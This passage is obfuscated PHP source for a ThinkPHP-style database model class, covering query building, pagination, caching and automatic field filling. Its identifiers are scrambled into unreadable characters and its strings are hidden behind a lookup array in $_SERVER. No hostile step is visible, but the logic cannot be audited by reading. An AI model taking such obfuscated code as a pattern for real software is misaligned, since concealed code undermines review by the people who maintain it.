NOW_TIME >= $öÆÃÔ && NOW_TIME <= $”‘‹°¡¸; case $«Ø‘‘ºÅ[340]: return in_array(get_client_ip(), explode($«Ø‘‘ºÅ[50], $¾ƒè¢ê)); case $«Ø‘‘ºÅ[341]: return !in_array(get_client_ip(), explode($«Ø‘‘ºÅ[50], $¾ƒè¢ê)); case $«Ø‘‘ºÅ[328]: default: return $this->regex($à ©âò, $¾ƒè¢ê); } } public function query($ı–§ñë–, $´ úâ“— = false) { $º»åÇ =& $_SERVER[ñˆ‹ß¿÷]; if (!is_bool($´ úâ“—) && !is_array($´ úâ“—)) { $´ úâ“— = func_get_args(); array_shift($´ úâ“—); } $ı–§ñë– = str_replace(array($º»åÇ[231], $º»åÇ[342]), $º»åÇ[53], $ı–§ñë–); $ı–§ñë– = $this->parseSql($ı–§ñë–, $´ úâ“—); return $this->db->query($ı–§ñë–); } public function execute($Úİ·é•â, $¾İµ¥Í = false) { if (!is_bool($¾İµ¥Í) && !is_array($¾İµ¥Í)) { $¾İµ¥Í = func_get_args(); array_shift($¾İµ¥Í); } $Úİ·é•â = $this->parseSql($Úİ·é•â, $¾İµ¥Í); return $this->db->execute($Úİ·é•â); } protected function parseSql($Î¦å‹è, $ÆÈó¹û§) { $Á±®ùü =& $_SERVER[ñˆ‹ß¿÷]; if (!0 === $ÆÈó¹û§) { $Ä©äŠ«¡ = $this->_parseOptions(); $Î¦å‹è = $this->db->parseSql($Î¦å‹è, $Ä©äŠ«¡); } elseif (is_array($ÆÈó¹û§)) { $ÆÈó¹û§ = array_map(array($this->db, $Á±®ùü[343]), $ÆÈó¹û§); $Î¦å‹è = vsprintf($Î¦å‹è, $ÆÈó¹û§); } else { $Î¦å‹è = strtr($Î¦å‹è, array($Á±®ùü[344] => $this->getTableName(), $Á±®ùü[345] => think_config($Á±®ùü[244]))); } $this->db->setModel($this->name); return $Î¦å‹è; } public function db($öœçÜ·Ê = '', $§Û¶½Ç = '', $ÈîàÆä¡ = array()) { $Ò¹œãşÜ =& $_SERVER[ñˆ‹ß¿÷]; if ($Ò¹œãşÜ[12] === $öœçÜ·Ê && $this->db) { return $this->db; } static $Ë—ÒÂÒ¼ = array(); static $ã·ö¸“ñ = array(); if (!isset($ã·ö¸“ñ[$öœçÜ·Ê]) || isset($ã·ö¸“ñ[$öœçÜ·Ê]) && $§Û¶½Ç && $Ë—ÒÂÒ¼[$öœçÜ·Ê] != $§Û¶½Ç) { if (!empty($§Û¶½Ç) && is_string($§Û¶½Ç) && !1 === strpos($§Û¶½Ç, $Ò¹œãşÜ[8])) { $§Û¶½Ç = think_config($§Û¶½Ç); } $öœçÜ·Ê = think_guid($§Û¶½Ç); $ã·ö¸“ñ[$öœçÜ·Ê] = Db::getInstance($§Û¶½Ç); } elseif (NULL === $§Û¶½Ç) { $ã·ö¸“ñ[$öœçÜ·Ê]->close(); unset($ã·ö¸“ñ[$öœçÜ·Ê]); return; } if (!empty($ÈîàÆä¡)) { if (is_string($ÈîàÆä¡)) { parse_str($ÈîàÆä¡, $ÈîàÆä¡); } foreach ($ÈîàÆä¡ as $øËµ÷‹ => $ı¥½™ìş) { $this->setProperty($øËµ÷‹, $ı¥½™ìş); } } $Ë—ÒÂÒ¼[$öœçÜ·Ê] = $§Û¶½Ç; $this->db = $ã·ö¸“ñ[$öœçÜ·Ê]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $˜½›Ÿ®¶ = get_class($this); if ($˜½›Ÿ®¶ == $_SERVER[ñˆ‹ß¿÷][346]) { return $this->name; } $this->name = substr($˜½›Ÿ®¶, 0, -5); } return $this->name; } public function getTableName() { $Ó¢¯Í± =& $_SERVER[ñˆ‹ß¿÷]; if (empty($this->trueTableName)) { $»×ßÍ³ø = !empty($this->tablePrefix) ? $this->tablePrefix : $Ó¢¯Í±[12]; if (!empty($this->tableName)) { $»×ßÍ³ø .= $this->tableName; } else { $»×ßÍ³ø .= think_parse_name($this->name); } $this->trueTableName = strtolower($»×ßÍ³ø); } return (!empty($this->dbName) ? $this->dbName . $Ó¢¯Í±[10] : $Ó¢¯Í±[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¯ç–—Ã =& $_SERVER[ñˆ‹ß¿÷]; return isset($this->fields[$¯ç–—Ã[251]]) ? $this->fields[$¯ç–—Ã[251]] : $this->pk; } public function getDbFields() { $ú¸îƒ¸Ğ =& $_SERVER[ñˆ‹ß¿÷]; if (isset($this->options[$ú¸îƒ¸Ğ[279]])) { $ıÀ€éÎ‹ = $this->db->getFields($this->options[$ú¸îƒ¸Ğ[279]]); return $ıÀ€éÎ‹ ? array_keys($ıÀ€éÎ‹) : !1; } if ($this->fields) { $ıÀ€éÎ‹ = $this->fields; unset($ıÀ€éÎ‹[$ú¸îƒ¸Ğ[250]], $ıÀ€éÎ‹[$ú¸îƒ¸Ğ[251]], $ıÀ€éÎ‹[$ú¸îƒ¸Ğ[252]], $ıÀ€éÎ‹[$ú¸îƒ¸Ğ[249]]); return $ıÀ€éÎ‹; } return !1; } public function data($õ¤µ×Ÿ = '') { $šó¢ƒÛ =& $_SERVER[ñˆ‹ß¿÷]; if ($šó¢ƒÛ[12] === $õ¤µ×Ÿ && !empty($this->data)) { return $this->data; } if (is_object($õ¤µ×Ÿ)) { $õ¤µ×Ÿ = get_object_vars($õ¤µ×Ÿ); } elseif (is_string($õ¤µ×Ÿ)) { parse_str($õ¤µ×Ÿ, $õ¤µ×Ÿ); } elseif (!is_array($õ¤µ×Ÿ)) { think_exception(think_lang($šó¢ƒÛ[271])); } $this->data = $õ¤µ×Ÿ; return $this; } public function join($òæ©ÊùÄ) { $‘¿Èşö =& $_SERVER[ñˆ‹ß¿÷]; if (is_array($òæ©ÊùÄ)) { $this->options[$‘¿Èşö[282]] = $òæ©ÊùÄ; } elseif (!empty($òæ©ÊùÄ)) { $this->options[$‘¿Èşö[282]][] = $òæ©ÊùÄ; } return $this; } public function union($‡íô‹¼ù, $¾¤ÅŸÙ­ = false) { $¡‘¿ˆş =& $_SERVER[ñˆ‹ß¿÷]; if (empty($‡íô‹¼ù)) { return $this; } if ($¾¤ÅŸÙ­) { $this->options[$¡‘¿ˆş[347]][$¡‘¿ˆş[348]] = !0; } if (is_object($‡íô‹¼ù)) { $‡íô‹¼ù = get_object_vars($‡íô‹¼ù); } if (is_string($‡íô‹¼ù)) { $õç•Ô±· = $‡íô‹¼ù; } elseif (is_array($‡íô‹¼ù)) { if (isset($‡íô‹¼ù[0])) { $this->options[$¡‘¿ˆş[347]] = array_merge($this->options[$¡‘¿ˆş[347]], $‡íô‹¼ù); return $this; } else { $õç•Ô±· = $‡íô‹¼ù; } } else { think_exception(think_lang($¡‘¿ˆş[271])); } $this->options[$¡‘¿ˆş[347]][] = $õç•Ô±·; return $this; } public function cache($İ‰¥ìÑŸ = true, $°ìúºİ‰ = null, $³Ú³÷Ğİ = '') { $‰íÎëÅÇ =& $_SERVER[ñˆ‹ß¿÷]; if (!1 !== $İ‰¥ìÑŸ) { $this->options[$‰íÎëÅÇ[349]] = array($‰íÎëÅÇ[94] => $İ‰¥ìÑŸ, $‰íÎëÅÇ[339] => $°ìúºİ‰, $‰íÎëÅÇ[33] => $³Ú³÷Ğİ); } return $this; } public function field($·½˜ı‹Ï, $˜µÒªÃ’ = false) { $¡Î‘¸óÜ =& $_SERVER[ñˆ‹ß¿÷]; if (!0 === $·½˜ı‹Ï) { $˜ÀÅ©û¼ = $this->getDbFields(); $·½˜ı‹Ï = $˜ÀÅ©û¼ ? $˜ÀÅ©û¼ : $¡Î‘¸óÜ[188]; } elseif ($˜µÒªÃ’) { if (is_string($·½˜ı‹Ï)) { $·½˜ı‹Ï = explode($¡Î‘¸óÜ[50], $·½˜ı‹Ï); } $˜ÀÅ©û¼ = $this->getDbFields(); $·½˜ı‹Ï = $˜ÀÅ©û¼ ? array_diff($˜ÀÅ©û¼, $·½˜ı‹Ï) : $·½˜ı‹Ï; } $this->options[$¡Î‘¸óÜ[273]] = $·½˜ı‹Ï; return $this; } public function scope($È…ùşşá = '', $€îíœÀ® = NULL) { $³Ã©´´È =& $_SERVER[ñˆ‹ß¿÷]; if ($³Ã©´´È[12] === $È…ùşşá) { if (isset($this->_scope[$³Ã©´´È[37]])) { $ÅÙè£ç© = $this->_scope[$³Ã©´´È[37]]; } else { return $this; } } elseif (is_string($È…ùşşá)) { $Å¬ø¬ÉÏ = explode($³Ã©´´È[50], $È…ùşşá); $ÅÙè£ç© = array(); foreach ($Å¬ø¬ÉÏ as $Ô£µÂì·) { if (!isset($this->_scope[$Ô£µÂì·])) { continue; } $ÅÙè£ç© = array_merge($ÅÙè£ç©, $this->_scope[$Ô£µÂì·]); } if (!empty($€îíœÀ®) && is_array($€îíœÀ®)) { $ÅÙè£ç© = array_merge($ÅÙè£ç©, $€îíœÀ®); } } elseif (is_array($È…ùşşá)) { $ÅÙè£ç© = $È…ùşşá; } if (is_array($ÅÙè£ç©) && !empty($ÅÙè£ç©)) { $this->options = array_merge($this->options, array_change_key_case($ÅÙè£ç©)); } return $this; } public function where($‡Çé‰•¬, $Í ¦¡ü = null) { $½Ëİ…ó =& $_SERVER[ñˆ‹ß¿÷]; if (!is_null($Í ¦¡ü) && is_string($‡Çé‰•¬)) { if (!is_array($Í ¦¡ü)) { $Í ¦¡ü = func_get_args(); array_shift($Í ¦¡ü); } $Í ¦¡ü = array_map(array($this->db, $½Ëİ…ó[343]), $Í ¦¡ü); $‡Çé‰•¬ = vsprintf($‡Çé‰•¬, $Í ¦¡ü); } elseif (is_object($‡Çé‰•¬)) { $‡Çé‰•¬ = get_object_vars($‡Çé‰•¬); } elseif (is_array($‡Çé‰•¬)) { foreach ($‡Çé‰•¬ as $ú’ù•Ãæ => $¸ß·şí) { if ((is_numeric($ú’ù•Ãæ) || !$ú’ù•Ãæ) && is_string($¸ß·şí)) { if (strpos($¸ß·şí, $½Ëİ…ó[350]) === 0) { continue; } think_trace($½Ëİ…ó[351], $½Ëİ…ó[12], $½Ëİ…ó[49]); die; } } } if (is_string($‡Çé‰•¬) && $½Ëİ…ó[12] != $‡Çé‰•¬) { $Ç»áƒ÷Å = array(); $Ç»áƒ÷Å[$½Ëİ…ó[352]] = $‡Çé‰•¬; $‡Çé‰•¬ = $Ç»áƒ÷Å; } if (isset($this->options[$½Ëİ…ó[275]])) { $this->options[$½Ëİ…ó[275]] = array_merge($this->options[$½Ëİ…ó[275]], $‡Çé‰•¬); } else { $this->options[$½Ëİ…ó[275]] = $‡Çé‰•¬; } return $this; } public function limit($ªß÷¤µ, $§œÃ‹÷í = null) { $ö¸¢èùº =& $_SERVER[ñˆ‹ß¿÷]; $this->options[$ö¸¢èùº[292]] = is_null($§œÃ‹÷í) ? $ªß÷¤µ : $ªß÷¤µ . $ö¸¢èùº[50] . $§œÃ‹÷í; return $this; } public function page($ï€º´Ò, $¾®¢çÆ„ = null) { $¶¼«ª„í =& $_SERVER[ñˆ‹ß¿÷]; $this->options[$¶¼«ª„í[353]] = is_null($¾®¢çÆ„) ? $ï€º´Ò : $ï€º´Ò . $¶¼«ª„í[50] . $¾®¢çÆ„; return $this; } public function comment($İÍ×¶Â) { $this->options[$_SERVER[ñˆ‹ß¿÷][354]] = $İÍ×¶Â; return $this; } public function setProperty($åô¸Ôù­, $ÚøÎÌ§) { if (property_exists($this, $åô¸Ôù­)) { $this->{$åô¸Ôù­} = $ÚøÎÌ§; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\x54\151\155\145", "\164\x69\155\145", "\151\x6e\x73\145\x72\164\54\165\x70\144\x61\x74\x65", "\146\x75\x6e\x63\x74\x69\157\x6e"), array("\x63\x72\145\141\x74\145\x54\151\155\145", "\164\151\x6d\145", "\151\x6e\163\x65\162\x74", "\x66\x75\x6e\x63\x74\151\x6f\156")); public function setDataAuto($ Ç¨¯ü¸) { $this->dataAuto = $ Ç¨¯ü¸; } public function __construct($Á¶åéÓâ = '', $É¡™Ö£ = '', $â•ÄÙ® = '') { parent::__construct($Á¶åéÓâ, $É¡™Ö£, $â•ÄÙ®); } protected $tableMeta = array(); protected function _beforeInsert(&$¥¥Í‘Ì, $…ò¶”Ş) { $…¹õÌ¼ª =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->checkDataAutoHas($…¹õÌ¼ª[355])) { return; } $this->dataBeforeFilter($¥¥Í‘Ì, $…¹õÌ¼ª[355]); } protected function _beforeUpdate(&$Ä…ºö‘€, $¬‡‡ÖÚ) { $ëÑØ·Š =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->checkDataAutoHas($ëÑØ·Š[356])) { return; } $this->dataBeforeFilter($Ä…ºö‘€, $ëÑØ·Š[356]); } protected function _afterSelect(&$à¸»Õİ¦, $¹ñ˜Æå·) { if (!is_array($à¸»Õİ¦)) { return; } if (!$this->checkDataAutoHas($_SERVER[ñˆ‹ß¿÷][357])) { return; } foreach ($à¸»Õİ¦ as &$¦ ¶õŞö) { $this->dataAfterFilter($¦ ¶õŞö); } unset($¦ ¶õŞö); } protected function _afterFind(&$³–óéø½, $“ ßËãĞ) { if (!is_array($³–óéø½)) { return; } if (!$this->checkDataAutoHas($_SERVER[ñˆ‹ß¿÷][357])) { return; } $this->dataAfterFilter($³–óéø½); } public static function textEncode($Šê„¥) { if (!$Šê„¥) { return $Šê„¥; } $©³ó°ËÓ = json_encode($Šê„¥); $©³ó°ËÓ = preg_replace_callback($_SERVER[ñˆ‹ß¿÷][358], function ($…µİ¥Ã¥) { return addslashes($…µİ¥Ã¥[0]); }, $©³ó°ËÓ); return json_decode($©³ó°ËÓ); } public static function textDecode($ÕŸ÷º©µ) { $ÀïÖİ£î =& $_SERVER[ñˆ‹ß¿÷]; $íóı‚àú = json_encode($ÕŸ÷º©µ); $íóı‚àú = preg_replace_callback($ÀïÖİ£î[359], function ($«—”Ïü ) { return $_SERVER[ñˆ‹ß¿÷][97]; }, $íóı‚àú); return json_decode($íóı‚àú); } public function setAutoIncrement($ª±òñ™˜) { $‹¼÷½ïê = array($this->getPk() => $ª±òñ™˜); $¾¿¹£òæ = $this->data($‹¼÷½ïê)->add(); if ($¾¿¹£òæ) { $this->delete($¾¿¹£òæ); } } public function getAutoIncrement() { $ÈÔµğñÄ = $this->getTableName(); $­µ¥áƒ¯ = $this->max($this->getPk()); $¯—…œé = $this->query("\x73\x68\x6f\167\x20\164\141\x62\154\x65\x20\x73\164\141\x74\165\x73\x20\x77\x68\x65\x72\x65\40\116\141\155\145\75\x27{$ÈÔµğñÄ}\x27"); $Ğèšµ‡‚ = $¯—…œé[0][$_SERVER[ñˆ‹ß¿÷][360]]; $ôÛÁŒ = max($­µ¥áƒ¯, $Ğèšµ‡‚); return $ôÛÁŒ; } protected function _callBefore($È§ãŒË½, $Å¤‰¤£•) { return $this->cacheCallCheck($È§ãŒË½, $Å¤‰¤£•, !1); } protected function _callAfter($Úßç½âë, $Ê¡š›áœ) { return $this->cacheCallCheck($Úßç½âë, $Ê¡š›áœ, !0); } protected function cacheFunctionAlias($ñ–åâÊî) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Ò¯Ÿãµ, $„¥áÙÙ¥, $Ó¦øŞ¨ì = false) { $¬Áº†öÓ = $this->cacheFunctionAlias($„¥áÙÙ¥); if (!$¬Áº†öÓ) { return; } foreach ($¬Áº†öÓ as $¬¥ÊŞÇá => $Øí˜‡÷¬) { $Âº¸òçØ = $Øí˜‡÷¬[0]; $ùé‰×ëö = explode($_SERVER[ñˆ‹ß¿÷][50], $Øí˜‡÷¬[1]); if ($Ò¯Ÿãµ == $¬¥ÊŞÇá) { return $this->cacheFunctionGet($¬¥ÊŞÇá, $Âº¸òçØ); } if ($Ó¦øŞ¨ì && in_array($Ò¯Ÿãµ, $ùé‰×ëö)) { $this->cacheFunctionClear($¬¥ÊŞÇá, $Âº¸òçØ); } } } public function cacheFunctionGet($£§›·©Û, $ìÇ€Í÷) { $™•Á° = $this->cacheKeyMake($£§›·©Û, $ìÇ€Í÷); $Ìşªˆ = Cache::get($™•Á°); if (!is_array($Ìşªˆ)) { $Ìşªˆ = call_user_func_array(array($this, $£§›·©Û), array($ìÇ€Í÷, !0)); Cache::set($™•Á°, $Ìşªˆ); } return $Ìşªˆ; } public function cacheFunctionClear($¿¡èÍ¼‹, $åıò»¿) { $»ÍÍŒ•¯ = $åıò»¿; if (!is_array($åıò»¿)) { $»ÍÍŒ•¯ = array($åıò»¿); } foreach ($»ÍÍŒ•¯ as $É‚èÄá¾) { $€ëµ”úê = $this->cacheKeyMake($¿¡èÍ¼‹, $É‚èÄá¾); Cache::remove($€ëµ”úê); } } private function cacheKeyMake($Ã—ÃšãÕ, $ƒÏıË¡±) { $Ï÷ËÇ¹Ë =& $_SERVER[ñˆ‹ß¿÷]; return get_class($this) . $Ï÷ËÇ¹Ë[11] . $Ã—ÃšãÕ . $Ï÷ËÇ¹Ë[361] . $ƒÏıË¡±; } protected function selectPageReset() { $ì‰íñ¸± =& $_SERVER[ñˆ‹ß¿÷]; if (isset($GLOBALS[$ì‰íñ¸±[362]])) { return; } $GLOBALS[$ì‰íñ¸±[362]] = isset($GLOBALS[$ì‰íñ¸±[7]][$ì‰íñ¸±[363]]) ? $GLOBALS[$ì‰íñ¸±[7]][$ì‰íñ¸±[363]] : !1; $GLOBALS[$ì‰íñ¸±[364]] = isset($GLOBALS[$ì‰íñ¸±[7]][$ì‰íñ¸±[353]]) ? $GLOBALS[$ì‰íñ¸±[7]][$ì‰íñ¸±[353]] : !1; $GLOBALS[$ì‰íñ¸±[7]][$ì‰íñ¸±[363]] = !1; $GLOBALS[$ì‰íñ¸±[7]][$ì‰íñ¸±[353]] = !1; } protected function selectPageRestore() { $ÂãñıÈ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($GLOBALS[$ÂãñıÈ[362]])) { return; } $GLOBALS[$ÂãñıÈ[7]][$ÂãñıÈ[363]] = $GLOBALS[$ÂãñıÈ[362]]; $GLOBALS[$ÂãñıÈ[7]][$ÂãñıÈ[353]] = $GLOBALS[$ÂãñıÈ[364]]; if ($GLOBALS[$ÂãñıÈ[7]][$ÂãñıÈ[363]] === !1) { unset($GLOBALS[$ÂãñıÈ[7]][$ÂãñıÈ[363]]); } if ($GLOBALS[$ÂãñıÈ[7]][$ÂãñıÈ[353]] === !1) { unset($GLOBALS[$ÂãñıÈ[7]][$ÂãñıÈ[353]]); } unset($GLOBALS[$ÂãñıÈ[362]]); unset($GLOBALS[$ÂãñıÈ[364]]); } protected function selectPage($ŸüÛ´ÆŒ = 200, $­ùÆÖÇ· = 1) { $ÌÙÎ”å =& $_SERVER[ñˆ‹ß¿÷]; global $in; $ìô¢Û¡’ = $this->optionsValue(); $§İÜí´¶ = 50000; $ŸüÛ´ÆŒ = isset($in[$ÌÙÎ”å[363]]) && $in[$ÌÙÎ”å[363]] ? $in[$ÌÙÎ”å[363]] : $ŸüÛ´ÆŒ; if ($ŸüÛ´ÆŒ === -1) { $in[$ÌÙÎ”å[363]] = !1; $§İÜí´¶ = 100000000; $ŸüÛ´ÆŒ = $§İÜí´¶; } $è¸öò¤ = $ìô¢Û¡’; $è¸öò¤[$ÌÙÎ”å[365]] = array(); $ŸüÛ´ÆŒ = intval($ŸüÛ´ÆŒ); $ŸüÛ´ÆŒ = $ŸüÛ´ÆŒ <= 5 ? 5 : ($ŸüÛ´ÆŒ >= $§İÜí´¶ ? $§İÜí´¶ : $ŸüÛ´ÆŒ); $­ùÆÖÇ· = intval(isset($in[$ÌÙÎ”å[353]]) && $in[$ÌÙÎ”å[353]] ? $in[$ÌÙÎ”å[353]] : $­ùÆÖÇ·); $­ùÆÖÇ· = $­ùÆÖÇ· <= 1 ? 1 : $­ùÆÖÇ·; $Øİ×İÉ = array(); $÷üÅı×¬ = 1; if ($­ùÆÖÇ· == 1 && $÷üÅı×¬) { $this->optionsValue($ìô¢Û¡’); $Øİ×İÉ = $this->page($­ùÆÖÇ·, $ŸüÛ´ÆŒ)->select(); $¦è¦âÄ = is_array($Øİ×İÉ) ? count($Øİ×İÉ) : 0; if ($¦è¦âÄ < $ŸüÛ´ÆŒ) { $ÒÑ‰ÕÎ© = 1; } else { $this->optionsValue($è¸öò¤); $¦è¦âÄ = intval($this->count()); $ÒÑ‰ÕÎ© = ceil($¦è¦âÄ / $ŸüÛ´ÆŒ); } } else { $this->optionsValue($è¸öò¤); $¦è¦âÄ = intval($this->count()); $ÒÑ‰ÕÎ© = ceil($¦è¦âÄ / $ŸüÛ´ÆŒ); $­ùÆÖÇ· = $­ùÆÖÇ· >= $ÒÑ‰ÕÎ© ? $ÒÑ‰ÕÎ© : $­ùÆÖÇ·; $this->optionsValue($ìô¢Û¡’); $Øİ×İÉ = $this->page($­ùÆÖÇ·, $ŸüÛ´ÆŒ)->select(); } if (!is_array($Øİ×İÉ)) { $Øİ×İÉ = array(); } if ($ÒÑ‰ÕÎ© == 1) { $¦è¦âÄ = count($Øİ×İÉ); } $ø£¸ª«¬ = array($ÌÙÎ”å[366] => array($ÌÙÎ”å[367] => $¦è¦âÄ, $ÌÙÎ”å[363] => $ŸüÛ´ÆŒ, $ÌÙÎ”å[353] => $­ùÆÖÇ·, $ÌÙÎ”å[368] => $ÒÑ‰ÕÎ©), $ÌÙÎ”å[369] => $Øİ×İÉ); return $ø£¸ª«¬; } protected function checkLength($Û¶áú×ê, $ÆšË–ú¬ = 0, $øÄµÖ‰é = '') { $Ãèà‚ =& $_SERVER[ñˆ‹ß¿÷]; $ÆšË–ú¬ = $ÆšË–ú¬ ? $ÆšË–ú¬ : 65536; if (!$Û¶áú×ê || strlen($Û¶áú×ê) < $ÆšË–ú¬) { return; } $øÄµÖ‰é = $øÄµÖ‰é ? $øÄµÖ‰é . $Ãèà‚[71] : $Ãèà‚[12]; show_json($øÄµÖ‰é . LNG($Ãèà‚[370]) . "\x28{$ÆšË–ú¬}\51", !1); } protected function metaSet($ñ»ÌšÙÄ, $ãäË©Ì = null, $²œâ– = null) { $Ô‡ßÓĞË =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->tableMeta || !$ñ»ÌšÙÄ) { return !1; } $¿¹ë¿íã = $this->tableMeta[$Ô‡ßÓĞË[371]]; $–ÑÑÕ“§ = $this->tableMeta[$Ô‡ßÓĞË[372]]; $ë£äÅºŒ = Model($–ÑÑÕ“§); $©Ó×™½Ï = array($¿¹ë¿íã => $ñ»ÌšÙÄ, $Ô‡ßÓĞË[373] => $ãäË©Ì); if (is_null($ãäË©Ì)) { return $ë£äÅºŒ->where(array($¿¹ë¿íã => $ñ»ÌšÙÄ))->delete(); } if (is_null($²œâ–) && is_string($ãäË©Ì)) { return $ë£äÅºŒ->where($©Ó×™½Ï)->delete(); } $®ï¬Ï¤ù = is_array($ãäË©Ì) ? $ãäË©Ì : array(); if (is_string($ãäË©Ì)) { $®ï¬Ï¤ù[$ãäË©Ì] = $²œâ–; } $à’Äİ­ä = array(); foreach ($®ï¬Ï¤ù as $ÙÚÊ®À => $Ë˜Ûûû£) { if (is_null($Ë˜Ûûû£) && is_string($ÙÚÊ®À)) { $ë£äÅºŒ->where(array($¿¹ë¿íã => $ñ»ÌšÙÄ, $Ô‡ßÓĞË[373] => $ÙÚÊ®À))->delete(); continue; } $this->checkLength($Ë˜Ûûû£, !1, $–ÑÑÕ“§ . $Ô‡ßÓĞË[4] . $ÙÚÊ®À); $à’Äİ­ä[] = array($¿¹ë¿íã => $ñ»ÌšÙÄ, $Ô‡ßÓĞË[94] => $ÙÚÊ®À, $Ô‡ßÓĞË[374] => $Ë˜Ûûû£); } $à«­ã–˜ = $Ô‡ßÓĞË[375] . $–ÑÑÕ“§; CacheLock::lock($à«­ã–˜); $ë£äÅºŒ->where(array($¿¹ë¿íã => $ñ»ÌšÙÄ))->addAll($à’Äİ­ä, array(), !0); CacheLock::unlock($à«­ã–˜); return !0; } public function metaGet($ÛÓ‡ùÄ˜, $Ô‚¾²Í£ = false) { $•’¦ŒÔÃ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->tableMeta) { return array(); } $Ä—ıÙ¥Û = $this->tableMeta[$•’¦ŒÔÃ[371]]; $÷±´ÎƒÎ = Model($this->tableMeta[$•’¦ŒÔÃ[372]]); if ($Ô‚¾²Í£) { $»Îªíƒã = array($Ä—ıÙ¥Û => $ÛÓ‡ùÄ˜, $•’¦ŒÔÃ[94] => $Ô‚¾²Í£); return $÷±´ÎƒÎ->where($»Îªíƒã)->getField($•’¦ŒÔÃ[374]); } $»Îªíƒã = array($Ä—ıÙ¥Û => $ÛÓ‡ùÄ˜); $…÷ÜÕ¾ = $÷±´ÎƒÎ->field($•’¦ŒÔÃ[376])->where($»Îªíƒã)->select(); $…÷ÜÕ¾ = array_to_keyvalue($…÷ÜÕ¾, $•’¦ŒÔÃ[94], $•’¦ŒÔÃ[374]); return $…÷ÜÕ¾; } private function checkDataAutoHas($˜îÑš¨‚) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $±ã™àñ‡) { if (in_array($˜îÑš¨‚, explode($_SERVER[ñˆ‹ß¿÷][50], $±ã™àñ‡[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$­›„åï, $¸ÔÖıÂ) { $¢à¦®ù =& $_SERVER[ñˆ‹ß¿÷]; if (!is_array($­›„åï)) { return; } foreach ($this->dataAuto as $š•ÕÙŠ±) { $Å…İ€şš = $š•ÕÙŠ±[0]; if (!in_array($¸ÔÖıÂ, explode($¢à¦®ù[50], $š•ÕÙŠ±[2]))) { continue; } switch (trim($š•ÕÙŠ±[3])) { case $¢à¦®ù[321]: case $¢à¦®ù[322]: $èÇª—· = $š•ÕÙŠ±[1]; $¼¨ŞíÄĞ = isset($š•ÕÙŠ±[4]) ? (array) $š•ÕÙŠ±[4] : array(); if ($èÇª—· == $¢à¦®ù[203] && array_key_exists($Å…İ€şš, $­›„åï)) { if (!$­›„åï[$Å…İ€şš]) { unset($­›„åï[$Å…İ€şš]); } break; } if (isset($­›„åï[$Å…İ€şš])) { array_unshift($¼¨ŞíÄĞ, $­›„åï[$Å…İ€şš]); } if ($¢à¦®ù[321] == $š•ÕÙŠ±[3]) { $­›„åï[$Å…İ€şš] = call_user_func_array($èÇª—·, $¼¨ŞíÄĞ); } else { $­›„åï[$Å…İ€şš] = call_user_func_array(array(&$this, $èÇª—·), $¼¨ŞíÄĞ); } break; case $¢à¦®ù[270]: if (isset($­›„åï[$Å…İ€şš]) && $­›„åï[$Å…İ€şš]) { $­›„åï[$Å…İ€şš] = call_user_func_array(array(&$this, $š•ÕÙŠ±[1]), array($­›„åï[$Å…İ€şš])); } break; case $¢à¦®ù[273]: $­›„åï[$Å…İ€şš] = $­›„åï[$š•ÕÙŠ±[1]]; break; case $¢à¦®ù[294]: if (isset($­›„åï[$Å…İ€şš]) && !is_string($­›„åï[$Å…İ€şš])) { $­›„åï[$Å…İ€şš] = json_encode_force($­›„åï[$Å…İ€şš]); } break; case $¢à¦®ù[323]: if ($­›„åï[$Å…İ€şš] === $¢à¦®ù[12]) { unset($­›„åï[$Å…İ€şš]); } break; case $¢à¦®ù[324]: $­›„åï[$Å…İ€şš] = $š•ÕÙŠ±[1]; default: break; } } if ($¸ÔÖıÂ == $¢à¦®ù[355]) { $ºÈšï¸§ = strtolower($this->db->getDbType()); if (strpos($ºÈšï¸§, $¢à¦®ù[13]) !== 0) { return; } $Ô’€¹Ä = $this->field(!0)->fields; $‡à„° = $Ô’€¹Ä[$¢à¦®ù[252]]; if (isset($Ô’€¹Ä[$¢à¦®ù[251]])) { unset($‡à„°[$Ô’€¹Ä[$¢à¦®ù[251]]]); } foreach ($‡à„° as $–Óò¼ => $¸ÔÖıÂ) { if (!isset($­›„åï[$–Óò¼])) { $­›„åï[$–Óò¼] = $¢à¦®ù[12]; } } } } private function dataAfterFilter(&$û½‡ÑŞá) { $Ø„ê Õ =& $_SERVER[ñˆ‹ß¿÷]; foreach ($this->dataAuto as $µúá›¢×) { $ø³‚Ú‡ü = $µúá›¢×[0]; if (!isset($û½‡ÑŞá[$ø³‚Ú‡ü])) { continue; } if (!in_array($Ø„ê Õ[357], explode($Ø„ê Õ[50], $µúá›¢×[2]))) { continue; } switch (trim($µúá›¢×[3])) { case $Ø„ê Õ[321]: case $Ø„ê Õ[322]: $ğü›¤¶ã = isset($µúá›¢×[4]) ? (array) $µúá›¢×[4] : array(); array_unshift($ğü›¤¶ã, $û½‡ÑŞá[$ø³‚Ú‡ü]); if (isset($µúá›¢×[4]) && $µúá›¢×[4] == $Ø„ê Õ[377]) { $ğü›¤¶ã = array($û½‡ÑŞá[$ø³‚Ú‡ü]); } if ($Ø„ê Õ[321] == $µúá›¢×[3]) { $û½‡ÑŞá[$ø³‚Ú‡ü] = call_user_func_array($µúá›¢×[1], $ğü›¤¶ã); } else { $û½‡ÑŞá[$ø³‚Ú‡ü] = call_user_func_array(array(&$this, $µúá›¢×[1]), $ğü›¤¶ã); } break; case $Ø„ê Õ[270]: if (isset($û½‡ÑŞá[$ø³‚Ú‡ü]) && $û½‡ÑŞá[$ø³‚Ú‡ü]) { $û½‡ÑŞá[$ø³‚Ú‡ü] = 